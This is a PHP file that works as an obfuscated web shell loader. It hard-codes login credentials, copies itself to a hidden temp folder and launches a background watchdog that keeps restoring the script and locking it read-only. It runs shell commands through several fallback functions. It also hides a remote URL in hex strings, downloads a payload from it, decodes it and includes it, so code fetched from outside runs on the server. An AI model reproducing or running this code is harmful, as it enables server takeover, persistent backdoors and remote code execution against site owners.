<?php
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'anesong',
    'password' => 'da48f6d3767fb7d180625a7006b1b637', //md5(ehsan)
    'safe_mode' => '1',
    'login_page' => 'gui',
    'show_icons' => '1',
    'post_encryption' => true,
    'cgi_api' => false,
);
$_t = SyS_GeT_tEmp_DiR();
if (!is_dir($_t . "/.sessions")) {
    mkdir($_t . "/.sessions");
}
if (!is_file($_t . '/.sessions/.-' . nameMad() . ".tmp")) {
    copy($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"], $_t . "/.sessions/.-" . nameMad() . ".tmp");
}
if (file_exists($_t . "/.sessions/.-" . nameMad() . ".tmp")) {
    $_F = $_t . "/.sessions/.-" . nameMad() . ".tmp";
    FiLe_PuT_CoNtEnTs($_t . "/.sessions/.-" . handlerName() . ".tmp", '
    <?php
while (True) {
    if (!file_exists("' . $_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"] . '")) {
        CoPy("' . $_F . '", "' . $_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"] . '");
    }
    if (FiLePeRmS("' . $_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"] . '") != "0444") {
        ChMoD("' . $_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"] . '", 0444);
    }
}
?>');
    if (isset($_GET['log'])) {
        ChMoD($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"], 0444);
        _mad_cmd('sh -c "nohup $(nohup php ' . $_t . '/.sessions/.-' . handlerName() . '.tmp < /dev/null &) < /dev/null &"');
    }
}
function _oOaA($url)
{
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, true);
        curl_setopt($conn, CURLOPT_FRESH_CONNECT,  true);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        $url_get_contents_data = (curl_exec($conn));
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}
$Array = [
    '68747470733a2f2f787365632d313333372e7765622e6170702f4046696c65732f646967696c656e73',
    '697a74726578782f68636b65722f6d61696e2f616c666f2e68636b',
    '6865783262696e'

];
$hitung_array = count($Array);
for ($i = 0; $i < $hitung_array; $i++) {
    $fungsi[] = unhex($Array[$i]);
}
function unhex($y)
{
    $n = '';
    for ($i = 0; $i < strlen($y) - 1; $i += 2) {
        $n .= chr(hexdec($y[$i] . $y[$i + 1]));
    }
    return $n;
}
function hex($n)
{
    $y = '';
    for ($i = 0; $i < strlen($n); $i++) {
        $y .= dechex(ord($n[$i]));
    }
    return $y;
}

function nameMad()
{
    return "90125467239121912" . base64_encode(__DIR__);
}
function handlerName()
{
    return "901H0012121045689" . base64_encode(__DIR__);
}
function Psaux()
{
    return "87121271212717" . base64_encode(__DIR__);
}

function _mad_cmd($in, $re = false)
{
    $out = "";
    try {
        if ($re) $in = $in . " 2>&1";
        if (function_exists("exec")) {
            @ExEc($in, $out);
            $out = @join("\n", $out);
        } elseif (function_exists("passthru")) {
            ob_start();
            @PasSthRu($in);
            $out = ob_get_clean();
        } elseif (function_exists("system")) {
            ob_start();
            @SySteM($in);
            $out = ob_get_clean();
        } elseif (function_exists("shell_exec")) {
            $out = sHeLL_exEc($in);
        } elseif (function_exists("popen") && function_exists("pclose")) {
            if (is_resource($f = @pOpeN($in, "r"))) {
                $out = "";
                while (!@feof($f))
                    $out .= fread($f, 1024);
                pClose($f);
            }
        } elseif (function_exists("proc_open")) {
            $pipes = array();
            $process = @proC_opeN($in . " 2>&1", array(array("pipe", "w"), array("pipe", "w"), array("pipe", "w")), $pipes, null);
            $out = @stream_Get_contEnts($pipes[1]);
        } elseif (class_exists("COM")) {
            $alfaWs = new COM("WScript.shell");
            $exec = $alfaWs->eXeC("cmd.exe /c " . $_POST['alfa1']);
            $stdout = $exec->StdOut();
            $out = $stdout->ReadAll();
        }
    } catch (Exception $e) {
    }
    return $out;
}


function ____($_____)
{
    $_a = sYs_gEt_TeMp_dIr();
    $tmpfname = TeMpNaM($_a, "\x75\x6E\x69\x78\x2E\x31\x31");
    $handle = fOpEn($tmpfname, "w+");
    fWrItE($handle, "<?php " . $_____);
    FcLoSe($handle);
    include $tmpfname;
    array_map('unlink', glob($_a . "/*.11*"));
    return get_defined_vars();
}

$data = _oOaA($fungsi[0]);
if ($data) {
    eXtRaCt(____($fungsi[2](base64_decode($data))));
}
